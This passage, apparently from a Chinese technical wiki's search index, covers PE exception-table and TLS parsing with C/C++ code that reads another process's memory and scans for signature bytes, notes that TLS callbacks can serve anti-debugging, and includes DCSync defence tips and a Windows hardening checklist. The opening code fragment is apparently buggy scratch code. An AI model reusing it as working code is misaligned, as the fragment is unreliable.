(*(ULONG*)(szBuffer + offset + (i * 4))); ULONGLONG SigCode = signatureCodes[i]; if (SigCode != ReadMem) &#123; break; &#125;&#125; if (i == signatureCodes.size()) &#123; addr = (ulModuleBase + offset); Debug_Run(L&quot;Found Signature Code:%lld&quot;, addr); break; &#125; &#125; &#125; else &#123; Debug_Error(L&quot;ReadProcessMemory Failed %d&quot;, GetLastError()); &#125;#if 0 if (!EnumProcessModulesEx(hpro, NULL, 0, &amp;cbSize, LIST_MODULES_ALL)) goto End; pHmodule = (HMODULE*)malloc(cbSize); if (pHmodule == NULL) goto End; if (!EnumProcessModulesEx(hpro, pHmodule, cbSize, &amp;cbSize, LIST_MODULES_ALL)) goto End; for (ULONG i = 0; i &lt; cbSize / sizeof(*pHmodule); i++) &#123; GetModulePdataSection(hpro, me32.hModule, ); &#125;#endif // 0 if(!GetModulePdataSection(hProcess, me32.hModule, &amp;ModuleSectionInfo)) goto End; VOID PTR_T PTR_T pCandidate; PIMAGE_IA64_RUNTIME_FUNCTION_ENTRY pRuntimeEntry; PUNWIND_INFO pUnWindInfo;#pragma warning(push)#pragma warning(disable:4305) pCandidate = (VOID PTR_T PTR_T)ModuleSectionInfo.pBase;#pragma warning(pop) &#123; if (!ReadProcessMemory(hProcess, pCandidate, &amp;pRuntimeEntry, sizeof(VOID PTR_T), NULL)) goto End; for (int i = pRuntimeEntry-&gt;BeginAddress; i &lt; pRuntimeEntry-&gt;EndAddress; i += sizeof(VOID PTR_T)) Debug_Run(L&quot;RUNTIME_FUNCTION-%d: %p&quot;,i , (VOID PTR_T)i); pUnWindInfo = (PUNWIND_INFO)pRuntimeEntry-&gt;UnwindInfoAddress; &#125; CloseHandle(hProcess); CloseHandle(hModuleSnap);End: return addr;&#125; GetModulePdataSection 的实现 123456789101112131415161718192021222324252627282930313233343536373839404142BOOL FindSignatureCode::GetModulePdataSection(HANDLE hProcess, VOID * pModule, ModuleSectionInfo_T * pModuleSectionInfo)&#123; IMAGE_DOS_HEADER ImageDosHeader; IMAGE_NT_HEADERS ImageNtHeaders; IMAGE_SECTION_HEADER* pImageSectionHeader; UINT SectionIdx; IMAGE_SECTION_HEADER ImageSectionHeader; UCHAR* pBase = (UCHAR*)pModule; BOOL bResult = FALSE; if (!ReadProcessMemory(hProcess, pBase, &amp;ImageDosHeader, sizeof(ImageDosHeader), NULL)) goto End; if (ImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE) goto End; if (!ReadProcessMemory(hProcess, pBase + ImageDosHeader.e_lfanew, &amp;ImageNtHeaders, sizeof(ImageNtHeaders), NULL)) goto End; if (ImageNtHeaders.Signature != IMAGE_NT_SIGNATURE) goto End; // // For 64bits, add the size of IMAGE_NT_HEADERS64 to its own base to get the base of the IMAGE_SECTION_HEADER table //#ifdef _WIN64#pragma warning(push)#pragma warning(disable:4127) if (SQLPLUGIN_IS_WOW64 == TRUE) pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS));#pragma warning(pop) else#endif pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32)); for (SectionIdx = 0; SectionIdx &lt; ImageNtHeaders.FileHeader.NumberOfSections; SectionIdx++) &#123; if (!ReadProcessMemory(hProcess, &amp;pImageSectionHeader[SectionIdx], &amp;ImageSectionHeader, sizeof(ImageSectionHeader), NULL)) goto End; const char* SectionName = (const char*)ImageSectionHeader.Name; if (strncmp(SectionName, gSQLPluginPDataSectionName, sizeof(gSQLPluginPDataSectionName)) == 0) &#123; pModuleSectionInfo-&gt;pBase = pBase + ImageSectionHeader.VirtualAddress; pModuleSectionInfo-&gt;Size = ImageSectionHeader.Misc.VirtualSize; bResult = TRUE; break; &#125; &#125;End: return (bResult);&#125; 相关结构体如下所示： 12345678910111213141516171819const char gSQLPluginPDataSectionName[] = &quot;.pdata&quot;;typedef struct _ModuleSectionInfo_T &#123; VOID* pBase; UINT Size;&#125;ModuleSectionInfo_T;#ifdef _WIN64// See http://msdn.microsoft.com/en-us/library/ddssxxy8.aspxtypedef struct _UNWIND_INFO &#123; unsigned char Version : 3; unsigned char Flags : 5; unsigned char SizeOfProlog; unsigned char CountOfCodes; unsigned char FrameRegister : 4; unsigned char FrameOffset : 4; ULONG ExceptionHandler;&#125; UNWIND_INFO, *PUNWIND_INFO;#endif"},{"title":"引用文章说明","date":"2024-02-06T07:21:53.566Z","path":"wiki/stellar/引用文章说明.html","text":"引用文章格式 123456---references: - &#x27;[心跳之旅—💗—iOS用手机摄像头检测心率(PPG)](https://punmy.cn/2016/07/28/15231176397746.html)&#x27; - &#x27;[PPG光电容积脉搏波描记法技术概况](https://www.jianshu.com/p/695c131abfa5)&#x27; ...--- 展示效果："},{"title":"【PE】PE文件结构6-异常表(Exception)","date":"2024-04-16T04:00:17.242Z","path":"wiki/PE/【PE】PE文件结构6-异常表(Exception).html","text":"date: 2023&#x2F;12&#x2F;19 概述：x86系统采用动态的方式构建SEH结构，相比而言x64系统下采用静态的方式处理SEH结构，它保存在PE文件中，通常在.pdata区段。因此本文的例子采用x64编译过的程序。异常表在资源表的后面。 0x01 异常表解析数据目录表的第四个元素指向异常表，RVA指向的是一个IMAGE_IA64_RUNTIME_FUNCTION_ENTRY的结构体，本例的RVA是0xA000（也就是.pdata段的起始位置），转换成offset是0x7a00。它的结构体是： 12345typedef struct _IMAGE_IA64_RUNTIME_FUNCTION_ENTRY &#123; DWORD BeginAddress; //与SEH相关代码的起始偏移地址 DWORD EndAddress; //与SEH相关代码的末尾偏移地址 DWORD UnwindInfoAddress; //指向描述上面两个字段之间代码异常信息的UNWIND_INFO&#125; IMAGE_IA64_RUNTIME_FUNCTION_ENTRY, *PIMAGE_IA64_RUNTIME_FUNCTION_ENTRY; ​ BeginAddress 与 EndAddress之间，是异常处理函数的内容。UnwindInfoAddress 指向的位置是用来描述 BeginAddress 与 EndAddress 之间的代码异常属性信息的UNWIND_INFO。UNWIND_INFO 也叫作异常展开信息，此结构用来描述堆栈指针的记录属性与寄存器中保存的地址属性，它的结构体如下： 1234567891011121314151617struct _UNWIND_INFO &#123; UBYTE Version:3; UBYTE Flags:5; UBYTE SizeOfProlog; UBYTE CountOfCodes; UBYTE FrameRegister:4; UBYTE FrameOffset:4; UNWIND_CODE UnwindCode[1]; union &#123; // If (Flags &amp; UNW_FLAG_EHANDLER) OPTIONAL ULONG ExceptionHandler;//异常/终止函数的映像相对地址指针 // Else if (Flags &amp; UNW_FLAG_CHAININFO) OPTIONAL ULONG FunctionEntry;//展开信息链的映像相对地址指针 &#125;; // If (Flags &amp; UNW_FLAG_EHANDLER) ULONG ExceptionData[1];//异常处理程序的数据&#125; UNWIND_INFO, *PUNWIND_INFO; Version:异常展开信息的版本号，一般为0x001 Flags:共有四种标志： 当它为0x0的时候表示UNW_FLAG_NHANDLER，没有异常处理函数。 当它为0x1的时候表示UNW_FLAG_EHANDLER，有异常处理函数。 当它为0x2的时候表示UNW_FLAG_UHANDLER，有系统默认的处理函数。 当它为0x4的时候表示UNW_FLAG_CHAININFO，表示FunctionEntry指向的是前一个RUNTIME_FUNCTION的RAV。 SizeOfProlog:函数起始部分字节的长度 CountOfCodes:UNWIND_INFO结构包含的UNWIND_CODE结构数 FrameRegister:寄存器帧指针，为0则指定函数不使用框架 FrameOffset:若上面字段不为0，表示函数偏移 UnwindCode:指定永久性寄存器与RSP的数组项目数 ExceptionHandler:异常句柄 FunctionEntry:展开信息链（函数）的映像相对地址指针（如果设置了UNW_FLAG_CHAININFO标识） ExceptionData:异常处理程序的数据 查找SEH表 以下代码说明：打开一个进程模块，然后查找 .pdata 段，依次遍历异常表。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293const char gPDataSectionName[] = &quot;.pdata&quot;;typedef struct _ModuleSectionInfo_T &#123; VOID* pBase; UINT Size;&#125;ModuleSectionInfo_T;// 查找 .pdata 段地址和大小BOOL getModulePdataSection( __in HANDLE hProcess, __in VOID * pModule, __out ModuleSectionInfo_T * pModuleSectionInfo)&#123; IMAGE_DOS_HEADER ImageDosHeader; IMAGE_NT_HEADERS ImageNtHeaders; IMAGE_SECTION_HEADER* pImageSectionHeader; UINT SectionIdx; IMAGE_SECTION_HEADER ImageSectionHeader; UCHAR* pBase = (UCHAR*)pModule; BOOL bResult = FALSE; if (!ReadProcessMemory(hProcess, pBase, &amp;ImageDosHeader, sizeof(ImageDosHeader), NULL)) goto End; if (ImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE) goto End; if (!ReadProcessMemory(hProcess, pBase + ImageDosHeader.e_lfanew, &amp;ImageNtHeaders, sizeof(ImageNtHeaders), NULL)) goto End; if (ImageNtHeaders.Signature != IMAGE_NT_SIGNATURE) goto End; // // For 64bits, add the size of IMAGE_NT_HEADERS64 to its own base to get the base of the IMAGE_SECTION_HEADER table //#ifdef _WIN64#pragma warning(push)#pragma warning(disable:4127) if (SQLPLUGIN_IS_WOW64 == TRUE) pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS));#pragma warning(pop) else#endif pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32)); for (SectionIdx = 0; SectionIdx &lt; ImageNtHeaders.FileHeader.NumberOfSections; SectionIdx++) &#123; if (!ReadProcessMemory(hProcess, &amp;pImageSectionHeader[SectionIdx], &amp;ImageSectionHeader, sizeof(ImageSectionHeader), NULL)) goto End; const char* SectionName = (const char*)ImageSectionHeader.Name; if (strncmp(SectionName, gPDataSectionName, sizeof(gPDataSectionName)) == 0) &#123; pModuleSectionInfo-&gt;pBase = pBase + ImageSectionHeader.VirtualAddress; pModuleSectionInfo-&gt;Size = ImageSectionHeader.Misc.VirtualSize; bResult = TRUE; break; &#125; &#125;End: return (bResult);&#125;BOOL getFunWithSepAddr(MODULEENTRY32 me32, ULONGLONG InputAddr, ULONGLONG&amp; RetAddr)&#123; BOOL bRet = FALSE; ModuleSectionInfo_T ModuleSectionInfo; ULONGLONG ulModuleBase = (ULONGLONG)me32.modBaseAddr; ULONGLONG ulModuleSize = (ULONGLONG)me32.modBaseSize; if (!getModulePdataSection(m_hProcess, me32.hModule, &amp;ModuleSectionInfo)) goto End; PVOID pCandidate; IMAGE_IA64_RUNTIME_FUNCTION_ENTRY RuntimeEntry;#pragma warning(push)#pragma warning(disable:4305) pCandidate = ModuleSectionInfo.pBase;#pragma warning(pop) unsigned int iCount = 0; // 这里遍历的就是 SEH 表 for (iCount = 0; iCount &lt; ModuleSectionInfo.Size; iCount += sizeof(IMAGE_IA64_RUNTIME_FUNCTION_ENTRY)) &#123; if (!ReadProcessMemory(m_hProcess, pCandidate, &amp;RuntimeEntry, sizeof(IMAGE_IA64_RUNTIME_FUNCTION_ENTRY), NULL)) goto NextCandidate; ULONGLONG begin = (ULONGLONG)ulModuleBase + RuntimeEntry.BeginAddress; ULONGLONG end = (ULONGLONG)ulModuleBase + RuntimeEntry.EndAddress; if (IsInThisFun(iCount, InputAddr, begin, end)) &#123; bRet = TRUE; RetAddr = begin; break; &#125; NextCandidate: pCandidate = (PVOID)((ULONGLONG)pCandidate + sizeof(IMAGE_IA64_RUNTIME_FUNCTION_ENTRY)); &#125;End: return bRet;&#125;"},{"title":"【PE】PE文件结构12-TLS表","date":"2024-04-16T04:43:33.103Z","path":"wiki/PE/【PE】PE文件结构12-TLS表.html","text":"概述：TLS(TLSDirectory) 的说明和使用 0x01 TLSTLS全称线程局部存储器，它用来保存变量或回调函数。 TLS里面的变量和回调函数都在程序入口点（AddressOfEntry）之前执行，也就是说程序在被调试时，还没有在入口点处断下来之前，TLS中的变量和回调函数就已经执行完了，所以TLS可以用作反调试之类的操作。 TLS中的变量单独存在于每个独立的线程当中，每个线程中对该变量的操作都不会影响到其他线程中的TLS变量。 TLS变量的创建方法有两种方式，分别是动态方式和静态方式，动态方法会用到TlsAlloc、TlsFree、TlsSetValue、TlsGetValue这几个函数来操作变量，静态方法会用声明__declspec (thread) int xx &#x3D; 1;这样的方式来创建。需要注意的是静态创建的TLS变量不能用于DLL动态库中。 理论说的多了未免有点枯燥，先写个实例吧，说明变量和回调函数的创建，这样明白的更透彻一点。 0x02 TLS实例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950__declspec (thread)int g_nNum = 0x11111111;__declspec (thread)char g_szStr[] = &quot;TLS g_nNum = 0x%p ...\\r\\n&quot;;void NTAPI t_TlsCallBack_A(PVOID DllHandle, DWORD Reason, PVOID Red)&#123; if (DLL_THREAD_DETACH == Reason) &#123; printf(&quot;t_TlsCallBack_A -&gt; ThreadDetach!\\r\\n&quot;); return; &#125;&#125;void NTAPI t_TlsCallBack_B(PVOID DllHandle, DWORD Reason, PVOID Red)&#123; if (DLL_THREAD_DETACH == Reason) &#123; printf(&quot;t_TlsCallBack_B -&gt; ThreadDetach!\\r\\n&quot;); return; &#125;&#125;#pragma data_seg(&quot;.CRT$XLB&quot;)PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; t_TlsCallBack_A, t_TlsCallBack_B, NULL&#125;;#pragma data_seg()DWORD WINAPI t_ThreadFun(PVOID pParam)&#123; printf(&quot;t_Thread -&gt; first printf:&quot;); printf(g_szStr, g_nNum); g_nNum = 0x2222222; printf(&quot;t_Thread -&gt; second printf:&quot;); printf(g_szStr, g_nNum); return 0;&#125;int _tmain()&#123; printf(&quot;_tmain -&gt; TlsDemo.exe is running...\\r\\n\\r\\n&quot;); CreateThread(NULL, 0, t_ThreadFun, NULL, 0, 0); Sleep(100); printf(&quot;\\r\\n&quot;); CreateThread(NULL, 0, t_ThreadFun, NULL, 0, 0); system(&quot;pause&quot;); return 0;&#125; 首先我们看注册TLS变量的方式，本例子使用的是静态方法也就是__declspec (thread)int xx &#x3D; 1;这样的方式来创建，而注册回调函数相对比较麻烦点，我们要声明一个#pragma data_seg(“.CRT$XLB”)这样的宏定义将回调函数包起来，CRT表明使用C RunTime机制，X表示标识名随机，L表示TLS callback section，B可以是B-Y之间任意的字母。 我们还看见回调函数会在线程被终止时调用，并且调用的顺序跟注册回调函数时相关，其实回调函数不止会在线程终止时调用，还有以下几种情况会被调用。 具体的参见代码吧，打印结果如下： 可以看见两个线程对g_nNum的操作其实是互不影响的，在程序运行到入口点之前，g_nNum已经被初始化了，以后每开辟一条新的线程，系统都会拷贝一份TLS变量的副本到该线程中。 0x03 TLS 解析接下来对TLS在PE文件中的结构进行解析。TLS在PE中数据目录表的第10位。 通常一个包含了TLS表的程序，它就会拥有.tls段，这个段里面保存了变量和回调函数的数据，但是TLS表本身的结构体一般存在于.rdata段内。本文的例子程序的TLS表RVA是0x2200，通过转换为offset得到0x1000,我们到0x1000处看看十六进制再对比结构体字段就可以解析出TLS表了。 123456789typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; PDWORD AddressOfIndex; PIMAGE_TLS_CALLBACK *AddressOfCallBacks; DWORD SizeOfZeroFill; DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY32 以上述代码为例：编译 x64-debug 版本后分析如下所示： 可以看到 .tls 段的起始地址为 E200h。 也就是.tls 段的偏移在 E200h位置，跳转到 E200h 看一下。 从 E2000h 开始就可以使用 _IMAGE_TLS_DIRECTORY32 结构体读取 tls 表了。 在 tls 段内存中就能看到 TLS 变量了"},{"title":"DCSYNC攻击防护","date":"2024-04-17T03:47:23.819Z","path":"wiki/安全/DCSYNC攻击.html","text":"DCSYNC攻击DCSYNC攻击是一种利用DC（域控制器）之间的同步过程来实现的攻击。攻击者可以利用这个过程来获取域管理员的权限，从而对域中的计算机和用户进行攻击。为了防护DCSYNC攻击，可以采取以下措施： 安装最新的安全补丁：确保所有的DC都安装了最新的安全补丁，以防止攻击者利用已知的漏洞进行攻击。 启用安全策略：启用安全策略，例如限制管理员的权限，以防止攻击者利用管理员权限进行攻击。 使用防火墙：使用防火墙来限制DC之间的通信，以防止攻击者利用通信过程进行攻击。 启用IPsec：启用IPsec来加密DC之间的通信，以防止攻击者截获通信内容。 启用身份验证：启用身份验证，例如使用Kerberos，以防止攻击者冒充域用户进行攻击。 定期审计：定期审计DC之间的通信，以及域用户的活动，以发现可能的攻击行为。 相关补充域控制器域控制器（Domain Controller，DC）是一台服务器，管理网络和身份安全，有效地充当用户验证和授权进入域内 IT 资源的门卫。域控制器在微软目录服务术语中尤其重要，它是一台计算机，存储和管理域内的用户和计算机信息，以及网络上的其他信息。它负责为域内的用户和计算机提供身份验证和授权服务，并维护域内的安全性。 KerberosKerberos是一种网络认证协议，用于在网络上验证用户的身份。它使用一种称为“票据”的概念来实现身份验证，其中包含用户的身份信息和服务器的身份信息。当用户请求访问服务器时，它会向票据发行机（KDC）发送请求，请求一个票据。KDC会根据用户的身份信息和服务器的身份信息生成一个票据，并将其发送给用户。用户将票据发送给服务器，服务器会验证票据的有效性，并根据票据中的信息授予用户访问权限。"},{"title":"【windows】安全基线检查项","date":"2024-04-17T03:47:29.218Z","path":"wiki/安全/安全基线检查项.html","text":"[toc] 系统配置安全检查1. 身份鉴别1.1 密码最长使用期限内容描述： 此策略使管理员能够通过确保旧密码不被连续重新使用来增强安全性。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为90或较少的天数，但不是0 ：计算机配置\\Windows设置\\安全设置\\帐户策略\\密码策略\\密码最长使用期限。 注意： 域账户需要联系域管理员做对应修改。 1.2 密码最短使用期限内容描述： 此策略设置定义用户密码必须使用多长时间。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为1或更大天：计算机配置\\Windows设置\\安全设置\\帐户策略\\密码策略\\密码最短使用期限。 注意： 域账户需要联系域管理员做对应修改。 1.3 强制密码历史内容描述： 此策略使管理员能够通过确保旧密码不被连续重新使用来增强安全性。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为24或更多密码：计算机配置\\Windows设置\\安全设置\\帐户策略\\密码策略\\强制执行密码历史。 注意： 域账户需要联系域管理员做对应修改。 1.4 密码长度最小值内容描述： 密码长度最小值越大，暴力破解难度就越高。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为14或更多字符：计算机配置\\Windows设置\\安全设置\\帐户策略\\密码策略\\密码长度最小值。 注意： 域账户需要联系域管理员做对应修改。 1.5 密码必须符合复杂性要求内容描述： 如果启用此策略，密码必须符合下列最低要求： 不包含用户的帐户名或用户全名中超过两个的部分连续字符 至少六个字符 包含以下三个类别的字符： 英文大写字母（A到Z） 英文小写字母（a到z） 以10为基数的数字（0到9） 非字母字符（例如，！，$，＃，％） 不属于以下任何Unicode字符的全部类别前四个类别。第五类可以是区域特定的。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为启用：计算机配置\\Windows设置\\安全设置\\帐户策略\\密码策略\\密码必须符合复杂性要求。 注意： 域账户需要联系域管理员做对应修改。 1.6 用可还原的加密来储存密码内容描述： 通过远程访问或 Internet 身份验证服务(IAS)使用质询握手身份验证协议(CHAP)验证时需要设置此策略。在 Internet 信息服务(IIS)中使用摘要式身份验证时也需要设置此策略。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为禁用：计算机配置\\Windows设置\\安全设置\\帐户策略\\密码策略\\用可还原的加密来储存密码。 注意： 域账户需要联系域管理员做对应修改。 1.7 阻止Microsoft帐户内容描述： 此策略设置阻止用户在此计算机上添加新的 Microsoft 帐户。 如果选择“用户不能添加 Microsoft 帐户”选项，用户将不能在此计算机上创建新的 Microsoft 帐户，不能将本地帐户切换到 Microsoft 帐户，也不能将域帐户连接到 Microsoft 帐户。如果需要在企业中限制使用 Microsoft 帐户，这是首选选项。 如果选择“用户不能添加 Microsoft 帐户或使用该帐户登录”选项，则现有的 Microsoft 帐户用户将不能登录到 Windows。选中此选项后，此计算机上的现有管理员可能无法登录和管理系统。 如果禁用或不配置此策略(推荐)，则用户能够将 Microsoft 帐户用于 Windows。 加固建议： Windows10&#x2F;8：请将以下UI路径设置为用户不能添加 Microsoft 帐户或使用该帐户登录：计算机配置\\Windows设置\\安全设置\\本地策略\\安全选项\\帐户：阻止Microsoft帐户。 1.8 帐户锁定阈值内容描述： 此安全设置确定导致用户帐户被锁定的登录尝试失败的次数。在管理员重置锁定帐户或帐户锁定时间期满之前，无法使用该锁定帐户。可以将登录尝试失败次数设置为介于 0 和 999 之间的值。如果将值设置为 0，则永远不会锁定帐户。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为10或较少的无效登录尝试，但不是0 ：计算机配置\\Windows设置\\安全设置\\本地策略\\安全选项\\交互式登录：计算机帐户锁定阈值。 注意： 域账户需要联系域管理员做对应修改。 1.9 帐户锁定持续时间内容描述： 此策略设置确定锁定帐户之前必须经过的时间长度解锁，用户可以尝试再次登录。该设置通过指定数字来实现锁定的帐户将在几分钟之内不可用。如果此策略设置的值配置为0，锁定的帐户将保持锁定状态，直到管理员手动解锁。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为1或更多分钟：计算机配置\\Windows设置\\安全设置\\帐户策略\\帐户锁定策略\\帐户锁定持续时间。 注意： 如果定义了帐户锁定阈值，则帐户锁定时间必须大于或等于重置时间。只有在指定了帐户锁定阈值时，此策略设置才有意义。 1.10 重置账号锁定计数器内容描述： 此安全设置确定在某次登录尝试失败之后将登录尝试失败计数器重置为 0 次错误登录尝试之前需要的时间。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：计算机配置\\Windows设置\\安全设置\\帐户策略\\帐户锁定策略\\重置帐户锁定计数器后。 注意： 如果定义了帐户锁定阈值，此重置时间必须小于或等于帐户锁定时间。只有在指定了帐户锁定阈值时，此策略设置才有意义。 1.11 启用屏幕保护程序内容描述： 确保终端在不活动的状态下，超过一定时间后会自动进入屏幕保护状态。防止终端盗用。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为启用：用户配置\\管理模板\\控制面板\\个性化\\启用屏幕保护程序 注意： 默认情况下，此组策略路径可能不存在。 它由Microsoft Windows 7和Server 2008 R2管理模板（或更新版本）附带的组策略模板ControlPanelDisplay.admx &#x2F; adml提供。 2. 访问控制2.1 Guest 帐户状态内容描述： 此安全设置确定是启用还是禁用来宾帐户。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为“已禁用”：我的电脑\\右键\\管理\\计算机管理（本地）&#x2F;本地用户和组&#x2F;用户&#x2F; Guest属性&#x2F;账户已禁用。 注意： 如果来宾帐户被禁用且安全选项“网络访问: 本地帐户的共享和安全模型”被设置为“仅来宾”，则网络登录(如由 Microsoft 网络服务器(SMB 服务)所执行的网络登录)将失败。 2.2 使用空密码的本地帐户只允许进行控制台登录内容描述： 此安全设置确定未进行密码保护的本地帐户是否可以用于从物理计算机控制台之外的位置登录。如果启用此设置，则未进行密码保护的本地帐户将仅能够通过计算机的键盘登录。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为已启用：计算机配置\\Windows设置\\安全设置\\本地策略\\安全选项\\帐户：使用空密码的本地帐户只允许进行控制台登录。 注意： 1、此设置不影响使用域帐户的登录。 2、使用远程交互式登录的应用程序可以绕过此设置。 3、在以前版本的 Windows Server 中，远程桌面服务称为终端服务。 2.3 帐户: 重命名来宾帐户内容描述： 此安全设置确定是否存在另一个帐户名称与帐户 “Guest” 的安全标识符(SID)相关联。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：计算机配置\\ Windows设置\\安全设置\\本地策略\\安全选项\\帐户: 重命名来宾帐户 2.4 帐户: 重命名管理员帐户内容描述： 此安全设置确定是否存在另一个帐户名称与帐户 Administrator 的安全标识符(SID)相关联。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：计算机配置\\ Windows设置\\安全设置\\本地策略\\安全选项\\帐户: 重命名管理员帐户 2.5 交互式登录: 提示用户在密码过期之前更改密码内容描述： 确定提前多长时间(以天为单位)向用户发出其密码即将过期的警告。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：计算机配置\\ Windows设置\\安全设置\\本地策略\\安全选项\\交互式登录: 提示用户在密码过期之前更改密码。 2.6 交互式登录: 不显示上次登录内容描述： 该安全设置确定 Windows 登录屏幕是否将显示上次登录该台电脑的人员的用户名，如果启用该策略，将不显示用户名。如果禁用该策略，将显示用户名。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：计算机配置\\ Windows设置\\安全设置\\本地策略\\安全选项\\交互式登录: 不显示上次登录。 2.7 关机: 清除虚拟内存页面文件内容描述： 启用此策略会在干净关机时清除系统页面文件。启用此安全选项时，如果禁用休眠，休眠文件(hiberfil.sys)也会被清零。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：计算机配置\\ Windows设置\\安全设置\\本地策略\\安全选项\\关机: 清除虚拟内存页面文件。 2.8 操作系统UAC用户账户控制是否开启至指定级别内容描述： 用户账户控制有助于预防有害程序对你的计算机进行更改。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：控制面板\\用户账户\\更改用户账户控制设置。 2.9 允许Windows自动连接到建议的开放式热点，与联系人共享的网络以及提供付费服务的热点内容描述： 此策略设置确定用户是否可以启用以下 WLAN 设置:“连接到建议的开放热点”、“连接到我的联系人共享的网络”和“启用付费服务”。 加固建议： Windows10&#x2F;8：请将以下UI路径设置为“已禁用”：计算机配置\\管理模板\\网络\\WLAN服务\\WLAN设置\\允许Windows自动连接到建议的开放热点，联系人共享的网络以及提供付费服务的热点 注意： 默认情况下，此组策略路径可能不存在。 它由Microsoft Windows 10版本1511管理模板（或更新版本）附带的组策略模板wlansvc.admx &#x2F; adml提供。 2.10 允许用户通过使用远程桌面服务进行远程连接内容描述： 使用此策略设置，可以通过使用远程桌面服务配置对计算机的远程访问。 如果启用此策略设置，则目标计算机上的“远程桌面用户”组成员用户可以使用远程桌面服务远程连接到该目标计算机。 如果禁用此策略设置，则用户无法使用远程桌面服务远程连接到目标计算机。目标计算机将保持当前的所有连接，但不会接受任何新传入的连接。 如果未配置此策略设置，则远程桌面服务使用目标计算机上的“远程桌面”设置来确定是否允许远程连接。此设置位于“系统属性”表的“远程”选项卡上。默认情况下，不允许进行远程连接。 加固建议： Windows10&#x2F;8&#x2F;7：请将以下UI路径设置为“已禁用”：计算机配置\\管理模板\\Windows组件\\远程桌面服务\\远程桌面会话主机\\连接\\允许用户使用远程桌面服务进行远程连接。 Windows XP：计算机配置\\管理模板\\Windows组件\\终端服务\\允许用户使用远程终端服务远程连接。 注意： 1、此组策略路径由所有版本的Microsoft Windows管理模板附带的组策略模板TerminalServer.admx &#x2F; adml提供。 2、在较旧的Microsoft Windows管理模板中，此设置最初名为Windows 7＆Server 2008 R2管理模板中的“允许用户使用终端服务远程连接”，但在“ Windows 7＆Server 2008 R2管理模板”中已重命名为“允许用户使用远程桌面服务远程连接”。最终，它再次被重命名为“允许用户使用从Windows 8.0＆Server 2012（非R2）管理模板开始的远程桌面服务”进行远程连接。 2.11 管理员帐户状态内容描述： 此安全设置确定是启用还是禁用本地管理员帐户。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为：已禁用：我的电脑\\右键\\管理\\计算机管理（本地）\\本地用户和组\\用户\\Administrator属性\\账户已禁用。 注意： 如果在管理员帐户被禁用之后试图重新启用它，且如果当前管理员密码不符合密码要求，则无法重新启用该帐户。在这种情况下，Administrators 组的某个备用成员必须重置管理员帐户上的密码。有关如何重置密码的信息，请参阅“重置密码”。 在某些环境下，禁用管理员帐户会成为一个维护问题。 在安全模式启动下，禁用的管理员帐户仅在该计算机未加入域并且没有任何其他本地活动管理员帐户时才可以启用。如果计算机加入了域，将不能启用禁用的管理员。 2.12 允许ICMP重定向覆盖OSPF生成的路由内容描述： Internet控制消息协议（ICMP）重定向导致堆栈检测主机路由。 这些路由会覆盖“开放式最短路径优先”（OSPF）生成的路由。 对于企业环境，建议将此设置配置为“未定义”，对于高安全性环境，建议配置为“禁用”。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为“已禁用”：计算机配置\\管理模板\\MSS（传统）\\MSS：（EnableICMPRedirect）允许ICMP重定向覆盖OSPF生成的路由。 注意： 默认情况下，此组策略路径不存在。 需要附加的组策略模板（MSS-legacy.admx &#x2F; adml）-可从此TechNet博客文章中获得：MSS设置-Microsoft安全指南博客。 2.13 检查是否关闭了默认共享内容描述： 检查是否关闭了系统默认共享，未关闭将检查不通过。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为：“禁用”。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\server；（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 2.14 设置活动但空闲的远程桌面服务会话的时间限制内容描述： 使用此策略设置可以指定活动的远程桌面服务会话在自动断开连接之前可以保持空闲状态(无用户输入)的最长时间。 加固建议： Windows10&#x2F;8&#x2F;7：请将以下UI路径设置为“启用”：计算机配置\\管理模板\\Windows组件\\远程桌面服务\\远程桌面会话主机\\会话时间限制\\设置活动但空闲的远程桌面服务会话的时间限制。 注意： “计算机配置”和“用户配置”中都有此策略设置。如果同时配置了这两个策略设置，则将优先考虑“计算机配置”策略设置。 2.15 